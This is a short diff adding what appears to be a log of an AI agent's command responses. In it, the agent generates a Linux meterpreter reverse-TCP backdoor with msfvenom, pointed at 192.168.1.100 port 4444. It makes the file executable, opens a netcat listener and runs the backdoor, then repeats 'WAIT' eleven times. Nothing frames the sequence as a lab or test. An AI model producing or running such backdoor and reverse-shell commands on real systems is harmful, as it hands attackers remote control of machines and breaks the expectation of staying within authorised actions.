@@ -1,0 +1,24 @@
+RESPONSE: ```bash
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > backdoor.elf
+```
+
+RESPONSE: ```bash
+chmod +x backdoor.elf
+```
+RESPONSE: ```bash
+nc -lvnp 4444
+```
+RESPONSE: ```bash
+./backdoor.elf
+```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
+RESPONSE: ```WAIT```
